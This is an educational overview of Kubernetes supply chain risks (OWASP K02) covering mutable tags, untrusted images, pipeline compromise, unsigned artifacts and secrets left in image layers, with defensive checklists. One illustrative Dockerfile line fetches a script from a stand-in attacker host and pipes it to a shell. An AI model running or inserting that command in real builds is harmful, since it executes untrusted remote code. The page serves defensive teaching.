# K02: Supply Chain Vulnerabilities - Overview

## Table of Contents
- [What are Supply Chain Vulnerabilities?](#what-are-supply-chain-vulnerabilities)
- [Why Does This Matter?](#why-does-this-matter)
- [Technical Context](#technical-context)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Statistics](#prevalence-and-statistics)
- [Common Misunderstandings](#common-misunderstandings)

## What are Supply Chain Vulnerabilities?

**Supply Chain Vulnerabilities** (K02 in the OWASP Kubernetes Top 10) are the risks that enter a cluster through the *artifacts it runs* rather than through the cluster's own configuration. A Kubernetes workload is the end of a long assembly line: a base image, application code and its third-party dependencies, a build pipeline, a registry, a Helm chart or operator, and finally a manifest that pulls it all into a running Pod. Every stage in that line is an opportunity to introduce something vulnerable, tampered, or outright malicious—and Kubernetes will faithfully schedule whatever it is handed.

Unlike a single coding bug, K02 is about **trust and provenance**: *can you prove that what is running is exactly what you intended to run, built from sources you trust, and free of known-vulnerable components?* For most clusters the honest answer is "not really"—images are pulled by mutable tag from public registries, nobody knows what is inside a layer, and there is no signature to verify. That gap is the K02 attack surface.

### Core Concept

```
Trusted Supply Chain:
  Base image   -> minimal, trusted (distroless / verified vendor), regularly rebuilt
  References   -> pinned by immutable digest (sha256:...), never :latest
  Contents     -> SBOM generated and stored; every component known
  Provenance   -> image signed (cosign) with attestations (SLSA / in-toto)
  Scanning     -> CVE scan in CI AND enforced again at admission
  Registry     -> private registry / explicit allow-list of sources
  Runtime user -> non-root, read-only root filesystem
  Charts       -> Helm charts and operators vetted and version-pinned

Vulnerable Supply Chain:
  Base image   -> random public image, unknown maintainer, years stale
  References   -> image: myapp:latest  (mutable, resolves to who-knows-what)
  Contents     -> nobody knows what packages or binaries are in the layers
  Provenance   -> unsigned; no way to prove origin or detect tampering
  Scanning     -> images never scanned before or after deployment
  Registry     -> anything from Docker Hub / arbitrary registries is allowed
  Runtime user -> runs as root by default, writable filesystem
  Charts       -> curl | bash of an untrusted chart or operator
```

### Why It's Critical for Kubernetes

Kubernetes amplifies supply chain risk in ways a single host does not:

- It is **declarative and automated**: a manifest that references a poisoned or vulnerable image is reconciled automatically—no human looks at what actually landed on the node.
- It **pulls at scale**: one bad image or chart is scheduled across every replica, every node, and often every environment that shares the reference.
- It runs **third-party operators and controllers** with high privilege; a compromised operator image can hold cluster-wide permissions.
- Mutable tags mean **what you tested is not necessarily what runs**: `:latest` can resolve to a different digest on the next pull, silently changing the workload.
- A container that reaches the node is **one misconfiguration away from the host**, so malicious image content is a foothold for lateral movement and cluster takeover.

## Why Does This Matter?

### Business Impact

- **In-Cluster Code Execution**: A poisoned or backdoored image runs attacker code inside your trust boundary the moment it is scheduled—no exploit of your own application required.
- **Cryptojacking and Resource Abuse**: Malicious public images are routinely used to mine cryptocurrency on someone else's cluster, inflating cloud bills and degrading service.
- **Data Exposure and Exfiltration**: Code running in a Pod can read mounted secrets, service-account tokens, and reachable internal services, then quietly ship data out.
- **Regulatory and Contractual Fallout**: Shipping software with unknown or vulnerable components undermines SBOM, provenance, and due-diligence obligations that customers and regulators increasingly require.
- **Loss of Trust in Your Own Releases**: If you cannot prove what you shipped, a single tampered artifact can force a fleet-wide rebuild-and-rotate.

### Technical Impact

- **Remote Code Execution on Nodes**: Container content executes on worker nodes; combined with a weak `securityContext` it becomes host compromise.
- **Credential and Token Theft**: Malicious layers harvest embedded secrets, environment variables, and the Pod's service-account token for privilege escalation.
- **Exploitation of Known CVEs**: An unpatched base image or third-party library exposes documented, catalogued vulnerabilities to any attacker who fingerprints the version.
- **Persistence**: A backdoored image or operator re-establishes itself on every reschedule, surviving Pod restarts and node replacement.
- **Lateral Movement**: From one compromised Pod an attacker pivots to reachable services, the API server, and cloud metadata endpoints.

## Technical Context

### Where Supply Chain Risk Enters the Lifecycle

#### 1. Untrusted or Vulnerable Base Images

```dockerfile
FROM ubuntu:latest        # huge, mutable, hundreds of packages you never use
# ... months later this image is full of unpatched CVEs and unused binaries
```

**Risk**: A large, stale, or unverified base drags in known-vulnerable packages and extra binaries (shells, package managers) that widen the attack surface.

#### 2. Images Pulled by Mutable Tag Instead of Digest

```yaml
spec:
  containers:
    - name: app
      image: registry.example.com/app:latest   # resolves to a DIFFERENT digest over time
```

**Risk**: `:latest` (or any moving tag) means the running artifact is not pinned. What passed your tests can differ from what the node pulls, and a compromised tag silently swaps the workload.

#### 3. Malicious or Typosquatted Public Images

```yaml
image: docker.io/library-nginx:stable   # look-alike name, not the official image
image: docker.io/someuser/redis-prod    # unknown maintainer, backdoored layers
```

**Risk**: Public registries host look-alike and outright malicious images; a single character or an unfamiliar namespace can mean a crypto-miner or reverse shell baked into the layers.

#### 4. Compromised Build Pipeline

```dockerfile
# A tampered CI step injects an extra layer / binary before push
RUN curl -s http://attacker.example/implant.sh | sh   # added by a compromised runner
```

**Risk**: If the pipeline that builds and pushes images is compromised (leaked token, poisoned dependency, malicious action), attacker code is signed off as "our official build."

#### 5. Unsigned Images with No Provenance

```
$ cosign verify registry.example.com/app@sha256:...
Error: no signatures found        # nothing proves who built this or from what
```

**Risk**: Without signatures and attestations there is no way to detect a swapped or tampered image, and no way to prove the build source.

#### 6. Embedded Secrets in Image Layers

```dockerfile
COPY .env /app/.env               # baked into a layer, extractable forever
ENV AWS_SECRET_ACCESS_KEY=AKIA... # visible in image history to anyone who pulls it
```

**Risk**: Secrets copied or set during build persist in image history; anyone who can pull the image can extract them with `docker history` or by unpacking layers.

### Layers Where Supply Chain Risk Hides

| Lifecycle Stage | Typical Weakness | Consequence |
|-----------------|------------------|-------------|
| Base image | Large, stale, or unverified base | Known CVEs, bloated attack surface |
| Dependencies | Unpinned or vulnerable third-party libraries | Exploitable known vulnerabilities |
| Build pipeline | Compromised runner, poisoned action, leaked token | Injected/backdoored artifacts |
| Registry / distribution | Public pulls, no allow-list, mutable tags | Malicious or swapped images |
| Provenance | Unsigned images, no attestations, no SBOM | Tampering undetectable |
| Charts / operators | Untrusted Helm charts and operators | Privileged malicious workloads |
| Runtime defaults | Runs as root, secrets in layers | Escalation, credential theft |

## Real-World Impact

The incidents below are described as **classes** of publicly documented events. They illustrate how supply chain weaknesses are exploited without attributing invented specifics to any single victim.

### Case Study 1: Malicious Crypto-Miner Images on Public Registries

**Weakness**:
- Container images uploaded to public registries were given plausible, popular-sounding names and pulled by users who assumed they were legitimate.
- Clusters allowed pulling arbitrary public images with no scanning, signing, or allow-list.

**Impact**:
- Researchers have repeatedly documented public images that silently ran cryptocurrency miners, generating attacker profit on victims' infrastructure while inflating their cloud bills.

**Root Cause**: Implicit trust in public-registry images with no provenance verification and no admission control over image sources.

### Case Study 2: Dependency Confusion / Substitution

**Weakness**:
- Build systems resolved a dependency name from a public registry when an internal package of the same name was intended.
- An attacker published a malicious package under that name to the public index.

**Impact**:
- This documented class of attack causes malicious code to be pulled into builds and, ultimately, into container images that ship to production—executing inside the trust boundary.

**Root Cause**: Ambiguous dependency resolution and lack of provenance/pinning, so an untrusted source could substitute for a trusted one.

### Case Study 3: Build-Pipeline Compromise (SolarWinds-class)

**Weakness**:
- The build/release pipeline itself was compromised, so malicious code was inserted into an otherwise legitimate, signed-off artifact.

**Impact**:
- Because the tampered artifact carried the vendor's normal trust markers, downstream consumers deployed it as trusted software—the defining lesson of this widely reported class of incident.

**Root Cause**: Trust placed in the *output* of a pipeline without independently verifiable provenance (reproducible builds, attestations) covering how the artifact was produced.

## Prevalence and Statistics

Supply Chain Vulnerabilities are consistently rated among the **hardest to control and most impactful** categories in the OWASP Kubernetes Top 10, because the risk is inherited from artifacts an organisation often did not build and cannot fully see into.

Rather than cite precise breach counts (which vary by source and year), the defensible picture is:

- The overwhelming majority of container images in real clusters are pulled by **mutable tag** and are **unsigned**, so provenance cannot be verified.
- Image scanning routinely finds **known, catalogued CVEs** in base layers and third-party dependencies of images already running in production.
- The impact is rated **severe**: it ranges from resource abuse (cryptojacking) up to in-cluster code execution and full compromise via a backdoored image or operator.

> Note: exact percentages differ between reports and years. Treat any single figure as illustrative; the durable takeaway is that most clusters cannot currently prove what they are running or what is inside it.

## Common Misunderstandings

### Myth 1: "It's from Docker Hub, so it's fine"

**Reality**: Public registries host anyone's images, including typosquatted and malicious ones. Popularity and a familiar-looking name are not provenance. Verify the source, pin the digest, and scan the contents.

### Myth 2: "We use the official base image, so we're safe"

**Reality**: Even a trusted base accumulates CVEs over time. A base that was clean at build is vulnerable months later. Rebuild regularly and scan on every build, not just once.

### Myth 3: "The tag is stable, so the image is stable"

**Reality**: Tags are mutable pointers. `:latest`—or even `:1.2.3`—can be repushed to a different digest. Only an immutable digest (`@sha256:...`) guarantees the artifact you tested is the artifact that runs.

### Myth 4: "We scan images, so the supply chain is covered"

**Reality**: Scanning finds *known* CVEs; it does not prove *provenance*. A scan will not tell you the image was swapped, tampered with, or built by a compromised pipeline. Scanning and signing solve different problems—you need both.

### Myth 5: "A Helm chart from the internet is just config"

**Reality**: Charts and operators deploy real, often privileged workloads and pull their own images. An untrusted chart can grant itself cluster-wide permissions or run an unvetted image. Vet and pin them like any other dependency.

### Myth 6: "Provenance is only for regulated industries"

**Reality**: Signing and SBOMs are how you answer "is this ours and what is in it?" during an incident. Without them, responding to a tampered-artifact report means rebuilding blind. Every team that ships containers benefits.

## How K02 Differs from Related Issues

| Aspect | K02 Supply Chain | K01 Insecure Workload Config | K08 Vulnerable Components |
|--------|------------------|------------------------------|--------------------------|
| **Root cause** | Untrusted / unverifiable artifacts | Insecure Pod/manifest settings | Outdated components in use |
| **Where it lives** | Build & distribution pipeline | Workload spec / securityContext | Running dependency versions |
| **Typical fix** | Sign, verify, pin, SBOM, scan | Harden the Pod spec | Patch / upgrade |
| **Detection** | Provenance check, image scan, admission | Manifest / policy audit | SCA, version audit |

## Key Takeaways

1. **The cluster runs what it is handed**—risk enters through images, charts, and pipelines, not just your own code.
2. **Provenance is the core question**—can you prove what is running is what you intended, from a source you trust?
3. **Pin by digest, never by mutable tag**—`:latest` means the artifact can change out from under you.
4. **Scanning and signing are complementary**—one finds known CVEs, the other proves origin; you need both.
5. **Enforce at admission**—a policy that blocks unsigned, unscanned, or untrusted images is the gate that makes the rest real.

## How to Identify if You're Vulnerable

- [ ] Are images referenced by immutable digest, or by mutable tags like `:latest`?
- [ ] Are your base images minimal and trusted (e.g. distroless), and rebuilt regularly?
- [ ] Is every image scanned for CVEs in CI *and* re-checked at admission?
- [ ] Are images signed, and does the cluster verify signatures before running them?
- [ ] Do you generate and store an SBOM for each image?
- [ ] Is there an allow-list of trusted registries, enforced by admission control?
- [ ] Are Helm charts and operators vetted and version-pinned before use?
- [ ] Have you confirmed no secrets are baked into image layers?
- [ ] Do containers run as non-root with a read-only root filesystem by default?
- [ ] Can you prove, for any running Pod, how and from what its image was built?

If you answered "no" or "not sure" to several of these, your cluster likely has an exploitable supply chain today.

## Next Steps

- **[Attack Vectors](attack-vectors.md)**: How attackers poison and exploit the container supply chain
- **[Prevention](prevention.md)**: Build a signed, scanned, and pinned supply chain
- **[Examples](examples.md)**: Insecure vs. secure Dockerfiles, manifests, and policies
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue with the rest of the OWASP Kubernetes Top 10
- **[Practice](/practice)**: Apply these controls in hands-on exercises
